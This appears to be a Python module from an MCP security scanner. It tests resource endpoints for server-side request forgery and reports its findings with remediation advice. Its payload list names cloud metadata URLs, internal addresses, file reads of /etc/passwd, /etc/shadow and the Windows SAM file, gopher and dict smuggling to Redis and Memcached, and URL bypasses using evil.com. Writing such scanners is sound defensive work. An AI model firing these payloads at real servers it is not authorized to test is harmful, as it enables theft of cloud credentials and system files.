"""
Resource URI SSRF Scanner.

Tests MCP resource endpoints for Server-Side Request Forgery vulnerabilities.
MCP resources use URIs that servers fetch - if not properly validated, attackers
can make the server fetch internal resources or cloud metadata.
"""

from __future__ import annotations

import logging
from typing import Any

from mcpsec.models import Finding, Severity, ServerProfile
from mcpsec.scanners.base import BaseScanner
from mcpsec.client.mcp_client import MCPSecClient

logger = logging.getLogger(__name__)


class ResourceSSRFScanner(BaseScanner):
    """Scans resource handlers for SSRF vulnerabilities."""
    
    name = "resource-ssrf"
    description = "Tests resource endpoints for Server-Side Request Forgery (SSRF)"
    
    # SSRF test payloads
    SSRF_PAYLOADS = [
        # Cloud metadata endpoints
        ("aws_metadata", "http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
        ("aws_metadata_v2", "http://169.254.169.254/latest/api/token", "AWS EC2 IMDSv2"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
        ("azure_metadata", "http://169.254.169.254/metadata/instance", "Azure metadata"),
        ("digitalocean_metadata", "http://169.254.169.254/metadata/v1/", "DigitalOcean metadata"),
        ("alibaba_metadata", "http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
        
        # Internal services
        ("localhost_http", "http://localhost/", "Localhost HTTP"),
        ("localhost_port", "http://localhost:8080/", "Localhost common port"),
        ("localhost_admin", "http://localhost/admin", "Localhost admin"),
        ("internal_ip", "http://192.168.1.1/", "Internal network"),
        ("internal_10", "http://10.0.0.1/", "Internal 10.x network"),
        ("internal_172", "http://172.16.0.1/", "Internal 172.16.x network"),
        ("ipv6_localhost", "http://[::1]/", "IPv6 localhost"),
        ("ipv6_localhost_port", "http://[::1]:8080/", "IPv6 localhost with port"),
        
        # Protocol smuggling
        ("file_etc_passwd", "file:///etc/passwd", "Local file read (passwd)"),
        ("file_etc_shadow", "file:///etc/shadow", "Local file read (shadow)"),
        ("file_windows", "file:///c:/windows/system32/config/sam", "Windows SAM file"),
        ("dict_protocol", "dict://localhost:11211/stats", "Dict protocol (Memcached)"),
        ("gopher_redis", "gopher://localhost:6379/_INFO", "Gopher to Redis"),
        
        # URL parsing tricks
        ("url_bypass_at", "http://evil.com@localhost/", "@ symbol URL bypass"),
        ("url_bypass_hash", "http://localhost#@evil.com/", "Hash URL bypass"),
        ("url_encoded", "http://127.0.0.1%00.evil.com/", "Null byte injection"),
        ("decimal_ip", "http://2130706433/", "Decimal IP (127.0.0.1)"),
        ("octal_ip", "http://0177.0.0.1/", "Octal IP format"),
        ("hex_ip", "http://0x7f.0x0.0x0.0x1/", "Hex IP format"),
        
        # DNS rebinding setup markers
        ("dns_rebind", "http://localtest.me/", "DNS rebinding test domain"),
    ]
    
    # Indicators of successful SSRF
    SSRF_SUCCESS_INDICATORS = [
        # AWS metadata
        "ami-", "instance-id", "security-credentials", "iam/info",
        # GCP metadata  
        "computeMetadata", "project/project-id", "instance/zone",
        # Azure metadata
        "vmId", "subscriptionId", "resourceGroupName",
        # File contents
        "root:x:0:0", "daemon:x:", "bin/bash", "bin/sh",
        # Windows
        "Administrator", "NTLM", "SAM",
        # Redis
        "redis_version", "connected_clients",
        # Generic internal
        "admin", "password", "secret", "token", "private",
    ]
    
    async def scan(self, profile: ServerProfile, client: MCPSecClient | None = None) -> list[Finding]:
        """Scan for SSRF vulnerabilities in resource handling."""
        findings = []
        
        if not profile.resources:
            return findings
        
        # Find resources that might accept URIs
        for resource in profile.resources:
            uri = resource.uri
            name = resource.name or "unknown"
            
            # Check if this resource has parameterized URI template or looks like a fetcher
            if "{" in uri or self._looks_like_fetch_resource(resource):
                # Static analysis finding first if not testing dynamically
                if not client:
                    findings.append(Finding(
                        severity=Severity.MEDIUM,
                        scanner=self.name,
                        tool_name=name,
                        title="Resource may be vulnerable to SSRF",
                        description=f"Resource '{name}' accepts URI input - potential SSRF vector",
                        detail=f"URI Template: {uri}",
                        remediation="Validate and whitelist allowed URI schemes and hosts"
                    ))
                    continue

                # Test SSRF payloads dynamically
                for payload_name, payload_uri, description in self.SSRF_PAYLOADS:
                    finding = await self._test_ssrf(client, name, uri, payload_name, payload_uri, description)
                    if finding:
                        findings.append(finding)
        
        return findings
    
    def _looks_like_fetch_resource(self, resource: Any) -> bool:
        """Heuristic: does this resource look like it fetches external URIs?"""
        name = (getattr(resource, "name", "") or "").lower()
        description = (getattr(resource, "description", "") or "").lower()
        
        fetch_indicators = ["fetch", "url", "http", "request", "download", "load", "get"]
        return any(ind in name or ind in description for ind in fetch_indicators)
    
    async def _test_ssrf(
        self, 
        client: MCPSecClient,
        resource_name: str, 
        uri_template: str, 
        payload_name: str, 
        payload_uri: str,
        description: str
    ) -> Finding | None:
        """Test a single SSRF payload against a resource."""
        if not client.session:
            return None
        
        try:
            # Dynamic testing - actually try the payload via read_resource
            # We use payload_uri as the URI to read
            result = await client.session.read_resource(payload_uri)
            
            if result:
                # result is usually a ReadResourceResult which has contents
                content_text = ""
                for content in result.contents:
                    if hasattr(content, "text"):
                        content_text += content.text
                    elif hasattr(content, "blob"):
                        content_text += str(content.blob)
                
                result_str = content_text.lower()
                
                # Check for SSRF success indicators
                evidence = ""
                for indicator in self.SSRF_SUCCESS_INDICATORS:
                    if indicator.lower() in result_str:
                        evidence = f"Matched indicator: '{indicator}'"
                        break
                
                if evidence:
                    return Finding(
                        severity=Severity.CRITICAL,
                        scanner=self.name,
                        tool_name=resource_name,
                        title="SSRF Vulnerability Confirmed",
                        description=f"Resource '{resource_name}' fetched internal/sensitive data via {description}",
                        detail=f"Payload: {payload_uri}\nEvidence: {evidence}",
                        evidence=result_str[:500],
                        remediation="Implement strict URI validation, whitelist allowed schemes (https only), block internal IPs"
                    )
                
                # Even without indicators, getting a response is suspicious
                return Finding(
                    severity=Severity.HIGH,
                    scanner=self.name,
                    tool_name=resource_name,
                    title="Potential SSRF - Unexpected Response",
                    description=f"Resource '{resource_name}' returned data for {description}",
                    detail=f"Payload: {payload_uri}\nResponse Length: {len(result_str)}",
                    evidence=result_str[:200],
                    remediation="Investigate why the server fetched this URI. Implement allowlist."
                )
                
        except Exception as e:
            # Errors are expected for blocked requests
            error_str = str(e).lower()
            
            # Some errors indicate partial success (connection made but blocked)
            suspicious_errors = ["timeout", "connection refused", "reset", "forbidden"]
            if any(err in error_str for err in suspicious_errors):
                return Finding(
                    severity=Severity.LOW,
                    scanner=self.name,
                    tool_name=resource_name,
                    title="SSRF Partially Blocked",
                    description=f"Server attempted connection to {description} but was blocked",
                    detail=f"Payload: {payload_uri}\nError: {error_str[:200]}",
                    remediation="Good - connection was blocked. Ensure all internal IPs are blocked."
                )
        
        return None
